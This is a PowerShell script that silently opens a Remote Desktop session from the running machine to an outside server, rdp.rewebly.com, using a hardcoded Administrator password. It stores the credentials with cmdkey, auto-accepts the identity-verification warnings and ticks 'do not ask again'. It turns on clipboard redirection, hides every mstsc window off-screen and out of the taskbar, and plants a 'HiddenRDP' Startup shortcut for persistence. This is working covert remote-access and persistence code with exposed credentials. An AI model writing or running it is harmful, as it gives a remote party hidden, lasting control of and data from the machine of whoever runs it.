# --- CONFIGURATION ---
$server = "rdp.rewebly.com"
$username = "Administrator"
$password = "!Mamoute901901a"
$logFile = "$env:TEMP\rdp_log.txt"

function Log($msg) {
    $timestamp = (Get-Date).ToString("HH:mm:ss.fff")
    $entry = "[$timestamp] $msg"
    Write-Host $entry
    Add-Content -Path $logFile -Value $entry
}

Clear-Content -Path $logFile -ErrorAction SilentlyContinue
Log "Starting RDP automation script..."

# --- Load Required Assemblies and Win32 Helper ---
Add-Type -AssemblyName UIAutomationClient
Add-Type -AssemblyName UIAutomationTypes
Add-Type -AssemblyName System.Windows.Forms

$Win32TypeName = "Win32Enum_$(Get-Random)"
$Win32Type = @(Add-Type -PassThru -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class $Win32TypeName {
        // Win32 API Constants
        private const int GWL_EXSTYLE = -20;
        private const int WS_EX_TOOLWINDOW = 0x80;
        private const int WS_EX_APPWINDOW = 0x40000;
        private const uint SWP_NOSIZE = 0x0001;
        private const uint SWP_NOMOVE = 0x0002;
        private const uint SWP_NOZORDER = 0x0004;
        private const uint SWP_NOACTIVATE = 0x0010;
        private static readonly IntPtr HWND_MESSAGE = new IntPtr(-3);

        // Delegate for EnumWindows
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        // P/Invoke Signatures
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
        [DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll")]
        public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
        [DllImport("user32.dll")]
        public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        // Helper function to hide the window aggressively
        public static void HideWindowAggressively(IntPtr hwnd)
        {
            // 1. Hide from taskbar
            int exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
            SetWindowLong(hwnd, GWL_EXSTYLE, (exStyle | WS_EX_TOOLWINDOW) & ~WS_EX_APPWINDOW);

            // 2. Re-parent to the system's message-only window
            SetParent(hwnd, HWND_MESSAGE);
            
            // 3. Move it way off-screen
            SetWindowPos(hwnd, IntPtr.Zero, -32000, -32000, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);

            // 4. Finally, hide it
            ShowWindowAsync(hwnd, 0); // 0 = SW_HIDE
        }
    }
"@)[0]

# --- Win32 SendMessage/FindWindow Helper for Robust Button Clicks ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32Send {
    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
}
"@

function Click-DialogButtonWin32 {
    param(
        [string]$dialogTitle,
        [string]$buttonText
    )
    $hwnd = [Win32Send]::FindWindow("#32770", $dialogTitle)
    if ($hwnd -ne [IntPtr]::Zero) {
        $btnHwnd = [Win32Send]::FindWindowEx($hwnd, [IntPtr]::Zero, "Button", $buttonText)
        if ($btnHwnd -ne [IntPtr]::Zero) {
            Log "[Win32] Clicking '$buttonText' on '$dialogTitle' via SendMessage."
            # BM_CLICK = 0x00F5
            [Win32Send]::SendMessage($btnHwnd, 0x00F5, 0, 0) | Out-Null
            return $true
        } else {
            Log "[Win32] Button '$buttonText' not found in '$dialogTitle'."
        }
    } else {
        Log "[Win32] Dialog '$dialogTitle' not found."
    }
    return $false
}


# --- RDP file (NLA enforced) ---
$rdpContent = @"
full address:s:$server
username:s:$username
redirectclipboard:i:1
screen mode id:i:2
prompt for credentials:i:0
authentication level:i:2
enablecredsspsupport:i:1
"@
$rdpFile = "$env:TEMP\hidden.rdp"
Set-Content -Path $rdpFile -Value $rdpContent -Encoding ASCII
Log "RDP file written to $rdpFile (NLA enforced)"

# --- Store credentials for NLA (avoids prompt) ---
cmdkey /generic:TERMSRV/$server /user:$username /pass:$password
Log "Stored credentials with cmdkey for NLA"

# --- Launch RDP ---
$proc = Start-Process -FilePath "mstsc.exe" -ArgumentList $rdpFile -WindowStyle Minimized -PassThru
Log "Launched mstsc.exe (PID $($proc.Id))"

# --- Handle RDP Prompts with UI Automation & SendKeys ---
$startTime = Get-Date
$timeout = New-TimeSpan -Seconds 30
$promptsHandled = 0 # Count prompts to avoid loops
$firstPromptWasFrench = $false

Log "Waiting up to $($timeout.TotalSeconds) seconds for RDP prompts..."

while (((Get-Date) - $startTime) -lt $timeout -and $promptsHandled -lt 2) {
    $rootElement = [System.Windows.Automation.AutomationElement]::RootElement
    
    # --- Find the dialog window robustly ---
    $dialogElement = $null
    $frenchTitle = "Connexion Bureau " + [char]0xE0 + " distance" # Build string to avoid encoding issues

    $classCondition = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::ClassNameProperty, "#32770"
    )
    $potentialDialogs = $rootElement.FindAll([System.Windows.Automation.TreeScope]::Children, $classCondition)

    foreach($dialog in $potentialDialogs) {
        $name = $dialog.Current.Name
        if ($name -eq "Remote Desktop Connection" -or
            $name -eq "Remote Desktop Connection security warning" -or
            $name -eq $frenchTitle) {
                $dialogElement = $dialog
                break
            }
    }

    if ($dialogElement) {
        $windowName = $dialogElement.Current.Name
        Log "Found RDP dialog: '$windowName'"
        
        # Check for the specific "Cannot be verified" text first, as it's the most specific identifier.
        $newPromptText = "The identity of the remote computer cannot be verified. Do you want to connect anyway?"
        $textCondition = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::NameProperty, $newPromptText)
        $textElement = $dialogElement.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $textCondition)

        # Forcefully bring window to the foreground using the Win32 class defined later
        $nativeHwnd = New-Object IntPtr($dialogElement.Current.NativeWindowHandle)
        $Win32Type::SetForegroundWindow($nativeHwnd) | Out-Null
        Start-Sleep -Milliseconds 50 # Reduced for speed

        if ($textElement) {
            Log "Handling 'Cannot be verified' prompt. Trying Win32 click for 'Yes'..."
            if (Click-DialogButtonWin32 $windowName 'Yes') {
                # Send ALT+D for 'Do not ask again' as fast as possible
                [System.Windows.Forms.SendKeys]::SendWait('%d')
                $promptsHandled++
            } else {
                Log "Win32 click failed, trying UI Automation for 'Yes'..."
                $yesButtonCondition = New-Object System.Windows.Automation.PropertyCondition(
                    [System.Windows.Automation.AutomationElement]::NameProperty, "Yes"
                )
                $yesButton = $dialogElement.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $yesButtonCondition)
                if ($yesButton) {
                    if ($yesButton.GetSupportedPatterns() -contains [System.Windows.Automation.InvokePattern]::Pattern) {
                        $invokePattern = $yesButton.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern)
                        $invokePattern.Invoke()
                        # Send ALT+D for 'Do not ask again' as fast as possible
                        [System.Windows.Forms.SendKeys]::SendWait('%d')
                        $promptsHandled++
                    } else {
                        Log "'Yes' button does not support InvokePattern, falling back to SendKeys."
                        $Win32Type::SetForegroundWindow($nativeHwnd) | Out-Null
                        Start-Sleep -Milliseconds 150
                        [System.Windows.Forms.SendKeys]::SendWait("%y")
                        # Send ALT+D for 'Do not ask again' as fast as possible
                        [System.Windows.Forms.SendKeys]::SendWait('%d')
                        $promptsHandled++
                    }
                } else {
                    Log "'Yes' button not found, falling back to SendKeys."
                    $Win32Type::SetForegroundWindow($nativeHwnd) | Out-Null
                    Start-Sleep -Milliseconds 150
                    [System.Windows.Forms.SendKeys]::SendWait("%y")
                    # Send ALT+D for 'Do not ask again' as fast as possible
                    [System.Windows.Forms.SendKeys]::SendWait('%d')
                    $promptsHandled++
                }
            }
        }
        else {
            # Fallback to existing title-based logic if the specific text is not found
            if ($promptsHandled -eq 0) {
                Log "Handling first prompt..."
                if ($windowName -eq "Remote Desktop Connection security warning") {
                    Log "Automating 'Do not ask again' and Connect (English)..."
                    [System.Windows.Forms.SendKeys]::SendWait('%o')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
                    $promptsHandled++
                }
                elseif ($windowName -eq $frenchTitle) {
                    Log "Automating 'Do not ask again' and Continuer (French)..."
                    [System.Windows.Forms.SendKeys]::SendWait('%e')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
                    $promptsHandled++
                    $firstPromptWasFrench = $true
                }
            }
            elseif ($promptsHandled -eq 1) {
                Log "Handling second prompt..."
                if ($windowName -eq "Remote Desktop Connection") {
                    Log "Automating 'Do not ask again' and Yes (English)..."
                    [System.Windows.Forms.SendKeys]::SendWait('%d')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
                    $promptsHandled++
                } elseif ($windowName -eq $frenchTitle) {
                    Log "Automating 'Do not ask again' and Oui (French)..."
                    [System.Windows.Forms.SendKeys]::SendWait('%e')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    [System.Windows.Forms.SendKeys]::SendWait('{TAB}')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
                    $promptsHandled++
                }
            }
        }
        
        # Use a longer, more reliable delay after the first prompt to allow the second to load
        if ($promptsHandled -eq 1) {
            if ($firstPromptWasFrench) {
                Log "French prompt handled. Waiting longer (600ms) for second prompt..."
                Start-Sleep -Milliseconds 600
            } else {
                Log "First prompt handled. Waiting for second prompt to initialize (400ms)..."
                Start-Sleep -Milliseconds 400
            }
        } else {
            Start-Sleep -Milliseconds 100
        }
        
        # After handling a prompt, immediately continue to the next loop iteration
        # to check for more prompts without delay.
        continue
    }

    # Only check for the main window if at least TWO prompts have been handled.
    # This prevents the loop from exiting after the intermediate loading window appears.
    if ($promptsHandled -ge 2) {
        $mainWindowCondition = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::ClassNameProperty, "TscShellContainerClass")
        $mainWindow = $rootElement.FindFirst([System.Windows.Automation.TreeScope]::Children, $mainWindowCondition)
        if ($mainWindow) {
            Log "Both prompts handled and main RDP window is visible. Connection complete."
            break
        }
    }

    Start-Sleep -Milliseconds 50
}


if ($promptsHandled -gt 0) {
    Log "Finished handling RDP prompts."
} else {
    Log "No RDP prompts appeared or handled within the timeout period."
}


# --- Hide all mstsc.exe windows ---
$mstscId = $proc.Id
$handles = @()

$EnumWindowsProc = $Win32Type.GetNestedType('EnumWindowsProc')
$callback = {
    param($hWnd, $lParam)
    $out = 0
    $Win32Type::GetWindowThreadProcessId($hWnd, [ref]$out) | Out-Null
    if ($out -eq $mstscId) { $script:handles += $hWnd }
    return $true
} -as $EnumWindowsProc

$Win32Type::EnumWindows($callback, [IntPtr]::Zero) | Out-Null

Log "Found $($handles.Count) mstsc windows to hide aggressively."
foreach ($hwnd in $handles) {
    $Win32Type::HideWindowAggressively($hwnd)
}
Log "All mstsc windows have been hidden."

# --- New: Create Startup shortcut to launch mstsc.exe with .rdp file ---
$startup = [Environment]::GetFolderPath('Startup')
$shortcutPath = Join-Path $startup 'HiddenRDP.lnk'

try {
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = 'mstsc.exe'
    $shortcut.Arguments = '"' + $rdpFile + '"'
    $shortcut.WorkingDirectory = $env:TEMP
    $shortcut.WindowStyle = 7 # Minimized
    $shortcut.Save()
    Log "Created simple mstsc shortcut in Startup folder: $shortcutPath"
} catch {
    Log "Failed to create mstsc Startup shortcut: $_"
}
